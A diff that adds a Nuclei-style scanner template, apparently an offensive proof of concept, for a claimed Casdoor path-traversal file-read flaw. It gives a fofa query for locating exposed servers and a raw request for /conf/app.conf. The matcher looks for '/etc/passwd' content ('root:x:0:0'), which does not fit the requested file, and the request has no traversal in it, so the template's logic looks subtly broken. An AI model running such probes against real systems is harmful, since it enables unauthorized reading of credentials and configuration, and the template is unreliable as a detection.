@@ -1,0 +1,24 @@
+id: casdoor-static-lfi
+
+info:
+  name: "Casdoor static 接口路径遍历导致任意文件读取"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: title="Casdoor"
+      Casdoor static 接口因路径遍历缺陷导致文件读取漏洞，攻击者可通过构造特定请求参数访问受限文件系统资源。该漏洞允许非授权读取服务器存储的敏感配置文件及系统文件，可能造成凭证泄露、源码暴露等安全风险。
+  tags: Casdoor
+
+http:
+- raw:
+  - |
+    GET /conf/app.conf HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'root:x:0:0'
